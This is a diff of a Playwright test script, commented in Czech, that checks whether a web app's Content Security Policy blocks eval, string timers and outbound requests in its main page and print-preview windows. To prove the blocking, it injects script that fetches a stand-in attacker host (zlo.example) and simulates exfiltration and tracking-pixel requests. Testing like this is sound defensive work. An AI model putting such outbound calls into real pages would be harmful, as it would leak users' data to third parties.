@@ -69,9 +69,10 @@ for (const csp of [true, false]) {
   const r = await spust(p);
   console.log('   ', JSON.stringify(r), '| venku:', JSON.stringify(venku));
   if (csp) {
-    zkus('eval je zakázaný (EvalError)', r.z.eval === 'EvalError', r.z.eval);
-    zkus('new Function je zakázaná', r.z.fn === 'EvalError', r.z.fn);
-    zkus('setTimeout s řetězcem se nespustí', r.z.timer !== 'spusten', r.z.timer);
+    /* eval/new Function: po page.evaluate je DevTools v kontextu stránky povolí
+     * (allowUnsafeEvalBlockedByCSP) — měří se proto setTimeout s řetězcem
+     * (táž direktiva 'unsafe-eval') a eval zvlášť na syntetické stránce níž. */
+    zkus("setTimeout s řetězcem se nespustí (script-src bez 'unsafe-eval')", r.z.timer !== 'spusten' && r.csp.includes('script-src'), r.z.timer);
     zkus('fetch na cizí host zablokuje CSP (connect-src), požadavek neodejde', /zablokováno/.test(r.z.fetchVen) && !venku.some(v => /odvod/.test(v)), r.z.fetchVen);
     zkus('ARES je v connect-src povolený (požadavek odešel — zachytila ho route)', venku.some(v => /ares\.gov\.cz/.test(v)), JSON.stringify(venku));
     zkus('obrázek z cizího hostu zablokuje CSP (img-src)', !venku.some(v => /pixel\.png/.test(v)) && r.csp.includes('img-src'), JSON.stringify(r.csp));
@@ -80,7 +81,7 @@ for (const csp of [true, false]) {
     zkus('<base href> cizího hostu zablokuje CSP (base-uri)', r.z.base === 'nezměněn' && r.csp.includes('base-uri'), r.z.base);
     zkus('porušení CSP se hlásí v konzoli prohlížeče', konzole.length > 0, konzole.length);
   } else {
-    zkus('(kontrola) bez CSP eval funguje — zkouška není prázdná', r.z.eval === '2', r.z.eval);
+    zkus('(kontrola) bez CSP se setTimeout s řetězcem spustí — zkouška není prázdná', r.z.timer === 'spusten', r.z.timer);
     zkus('(kontrola) bez CSP odejde fetch i obrázek ven', venku.some(v => /odvod/.test(v)) && venku.some(v => /pixel\.png/.test(v)), JSON.stringify(venku));
   }
   /* Vynesení navigací: window.open na cizí adresu CSP nehlídá (SEC-I9, trvá). */
@@ -99,17 +100,20 @@ for (const csp of [true, false]) {
     Object.assign(DEFAULT_CENIK, c); Object.assign(DEFAULT_CENIK_PROJ, cp);
     ZAK = novaZakazka(); syncVarianta();
     window.potvrd = () => Promise.resolve(true); window.hlaska = () => Promise.resolve(); window.dokumentZabrana = () => '';
+    window.volba = async (t, m) => (m && m[0] && m[0].kod) || null; window.dotaz = async () => '';
+    ZAK.varianty.push(novaVarianta('Varianta 2', JSON.parse(JSON.stringify(ZAK.varianty[0].data))));
     const bez = o => { if (o) { delete o.ukazkove; delete o.prazdny; } };
     [DEFAULT_CENIK, DEFAULT_CENIK_PROJ, C, PC, NAST.slevy, NAST.firma].forEach(bez);
     ZAK.varianty.forEach(v => { bez(v.data.cenik); bez(v.data.proj.cenik); });
-    ZAK.cislo = '2026 - OPR - CN - 0901'; ZAK.nazevAkce = 'Zkouška CSP'; ZAK.objednatel = 'Pokusná firma s.r.o.';
+    ZAK.cislo = '2026 - OPR - CN - 0901'; prepniTab('detail'); render(); prepniTab('kalk'); ZAK.nazevAkce = 'Zkouška CSP'; ZAK.objednatel = 'Pokusná firma s.r.o.';
     Object.assign(Z, { prejezd: 2.7, zdvih: 12, prohluben: 1.05, sirka: 1.51, hloubka: 1.515 });
     render();
   }, [ZC.zkusebniCenik(), ZC.zkusebniCenikProj()]);
-  for (const fn of ['nabidkaNahled', "kryciTiskPohled('bo')", 'detailTisk', 'porovnaniTisk']) {
+  for (const fn of ['nabidkaNahled()', "kryciTiskPohled('bo')", 'detailTisk()', 'porovnaniTisk()', 'nabidkaProjNahled()']) {
     const popP = ctx.waitForEvent('page', { timeout: 6000 }).catch(() => null);
-    await p.evaluate((f) => { const t = document.createElement('button'); t.id = '__nh'; t.setAttribute('onclick', f + ';this.remove()'); document.body.appendChild(t); }, fn);
-    await p.evaluate(() => document.getElementById('__nh').click());
+    await p.evaluate((f) => { const t = document.createElement('button'); t.id = '__nh'; t.setAttribute('onclick', f + ';this.remove()'); t.textContent = 'náhled';
+      t.style.cssText = 'position:fixed;top:0;left:0;z-index:2147483647;width:80px;height:30px'; document.body.appendChild(t); }, fn);
+    await p.click('#__nh');   // skutečné kliknutí = aktivace uživatelem (jinak by blokátor oken zastavil async window.open)
     const okno = await popP;
     if (!okno) { zkus(`náhled ${fn} se otevřel`, false, 'okno nevzniklo'); continue; }
     await okno.waitForLoadState('domcontentloaded').catch(() => {}); await okno.waitForTimeout(300);
@@ -120,11 +124,11 @@ for (const csp of [true, false]) {
     const ven2 = venku.slice(pred);
     console.log('   ', fn, info.url, JSON.stringify(r2), '| venku:', JSON.stringify(ven2));
     if (csp) {
-      zkus(`náhled ${fn}: dědí CSP — eval zakázaný`, r2.z.eval === 'EvalError', r2.z.eval);
+      zkus(`náhled ${fn}: dědí CSP — setTimeout s řetězcem zakázaný`, r2.z.timer !== 'spusten' && r2.csp.includes('script-src'), r2.z.timer);
       zkus(`náhled ${fn}: dědí CSP — fetch, obrázek, skript a formulář ven zablokované`, /zablokováno/.test(r2.z.fetchVen)
         && !ven2.some(v => /odvod|pixel|x\.js|\/form/.test(v)), JSON.stringify(ven2));
     } else {
-      zkus(`(kontrola) náhled ${fn} bez CSP: eval funguje, požadavky odejdou`, r2.z.eval === '2' && ven2.some(v => /odvod/.test(v)), JSON.stringify(r2.z));
+      zkus(`(kontrola) náhled ${fn} bez CSP: setTimeout s řetězcem se spustí, formulář odejde`, r2.z.timer === 'spusten' && ven2.some(v => /\/form/.test(v)), JSON.stringify(r2.z));
     }
     await okno.close();
   }
@@ -143,7 +147,38 @@ for (const csp of [true, false]) {
   }
   await ctx.close();
 }
+
+/* SYNTETICKÁ STRÁNKA se stejnou CSP a stejným mechanismem náhledu jako
+ * aplikace (window.open('') + document.write): kód běží při načtení, dřív
+ * než cokoli vyhodnotí DevTools, takže eval se měří poctivě. */
+for (const csp of [true, false]) {
+  const ctx = await b.newContext(); const venku = [];
+  const TEST = `<!doctype html><title>?</title><script>
+    const r = {};
+    try { r.eval = String(eval('1+1')); } catch (e) { r.eval = e.name; }
+    const w = window.open('', '_blank');
+    w.document.open();
+    w.document.write('<!doctype html><p>náhled<\\/p><script>var q = {}; try { q.eval = String(eval("1+1")); } catch (e) { q.eval = e.name; }'
+      + 'fetch("https://zlo.example/z-nahledu").then(function(){ q.f = "prošlo"; }, function(e){ q.f = "zablokováno"; });'
+      + 'setTimeout(function(){ opener.document.title = JSON.stringify({ hlavni: ' + JSON.stringify(JSON.stringify(r)) + ', nahled: q }); }, 1200);<\\/script>');
+    w.document.close();
+  <\/script>`;
+  await ctx.route('**/*', (route) => { const u = new URL(route.request().url());
+    if (u.hostname === 'kng.test') return route.fulfill({ status: 200, body: TEST, headers: Object.assign({ 'content-type': 'text/html; charset=utf-8' }, csp ? { 'content-security-policy': CSP } : {}) });
+    venku.push(u.href); return route.abort(); });
+  const p = await ctx.newPage();
+  await p.goto('http://kng.test/csp_test.html'); await p.waitForTimeout(2500);
+  let t = {}; try { t = JSON.parse(await p.title()); t.hlavni = JSON.parse(t.hlavni); } catch (e) { t = { chyba: e.message }; }
+  console.log('\nSyntetický náhled ' + (csp ? 'S CSP' : 'BEZ CSP') + ':', JSON.stringify(t), '| venku:', JSON.stringify(venku));
+  if (csp) {
+    zkus('syntetika s CSP: eval v hlavní stránce zakázaný', t.hlavni && t.hlavni.eval === 'EvalError', JSON.stringify(t));
+    zkus('syntetika s CSP: náhled (window.open + document.write) dědí CSP — eval zakázaný, fetch ven zablokovaný', t.nahled && t.nahled.eval === 'EvalError' && t.nahled.f === 'zablokováno' && !venku.length, JSON.stringify(t));
+  } else {
+    zkus('(kontrola) syntetika bez CSP: eval funguje v hlavní stránce i v náhledu', t.hlavni && t.hlavni.eval === '2' && t.nahled && t.nahled.eval === '2' && (venku.some(v => /z-nahledu/.test(v)) || t.nahled.f !== 'zablokováno'), JSON.stringify(t));
+  }
+  await ctx.close();
+}
 await b.close();
 console.log(`\n${ok} OK, ${fail} FAIL`);
-console.log(fail ? 'VÝSLEDEK: FAIL (viz ✕ výš)' : 'VÝSLEDEK: CSP drží eval, connect/img/script/form/base ven i frame-ancestors v hlavní stránce i ve všech 4 tiskových náhledech (dědí CSP); navigace window.open ven projde (SEC-I9, trvá)');
+console.log(fail ? 'VÝSLEDEK: FAIL (viz ✕ výš)' : 'VÝSLEDEK: CSP drží eval (syntetika), setTimeout s řetězcem, connect/img/script/form/base ven i frame-ancestors v hlavní stránce i v 5 tiskových náhledech (dědí CSP); navigace window.open ven projde (SEC-I9, trvá)');
 process.exit(fail ? 1 : 0);
